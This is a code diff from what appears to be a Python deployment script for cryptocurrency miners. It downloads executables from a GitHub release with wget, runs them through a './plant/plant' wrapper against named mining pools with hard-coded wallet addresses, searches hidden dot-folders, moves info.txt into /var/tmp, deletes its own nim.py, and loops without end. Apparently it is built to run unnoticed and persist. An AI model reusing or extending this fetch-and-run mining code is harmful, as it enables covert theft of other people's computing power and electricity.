@@ -38,14 +38,14 @@ downloads = {
         ]
     },
     "gpu": {
-        "link": "wget -q https://github.com/handevproject/starterpack/releases/download/1.0.2/non",
+        "link": "./plant/plant wget -q https://github.com/handevproject/starterpack/releases/download/1.0.2/non",
         "run": [
             "chmod +x non",
             "./plant/plant ./non -d=0 -a \"NQ389ADBRBMVUAD361F7JYLK105CFU9A0EQS\" -s nimiq.icemining.ca -p 2053 -n clarksye -t 4 --batchsize=45 -i Disable"
         ]
     },
     "cpu": {
-        "link": "wget -q https://github.com/handevproject/starterpack/releases/download/1.0.1/plane",
+        "link": "./plant/plant wget -q https://github.com/handevproject/starterpack/releases/download/1.0.1/plane",
         "run": [
             "chmod +x plane",
             "./plant/plant ./plane -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17052 -u v3DEMbMrwFetzmzEo6DeUKQnppXSqZZSxg.clarksye"
@@ -142,8 +142,8 @@ def set_ip(command_folder, ip, set_file = True):
 
     return
 
-def check_hidden_folder():
-    expected_hidden_folders = {".satu", ".dua", ".tiga", ".empat", ".lima", ".enam", ".tujuh"}
+def check_folder():
+    expected_hidden_folders = {"satu", "dua", "tiga", "empat", "lima", "enam", "tujuh"}
     
     hidden_folders = [folder for folder in os.listdir() if folder.startswith('.') and folder not in ('.', '..') and folder in expected_hidden_folders]
     
@@ -229,12 +229,12 @@ def reset():
 
     if args.cpu: 
         # handle cpu
-        run_bash_command(command_folder + "./plant/plant " + downloads['cpu']['link'])
+        run_bash_command(command_folder + downloads['cpu']['link'])
         run_cpu(command_folder)
     
     if args.gpu: 
         # handle gpu
-        run_bash_command(command_folder + "./plant/plant " + downloads['gpu']['link'])
+        run_bash_command(command_folder + downloads['gpu']['link'])
         run_gpu(command_folder)
 
     return
@@ -245,7 +245,7 @@ username = get_username()
 if args.reset:
     reset()
 else:
-    folder = check_hidden_folder()
+    folder = check_folder()
     if folder:
         command_folder = f"cd {folder} && "
 
@@ -278,7 +278,7 @@ shutil.move(home_directory + "/info.txt", "/var/tmp")
 if os.path.exists(home_directory + "/nim.py"):
     os.remove(home_directory + "/nim.py")
 
-folder = check_hidden_folder()
+folder = check_folder()
 command_folder = f"cd {folder} && "
 
 while True:
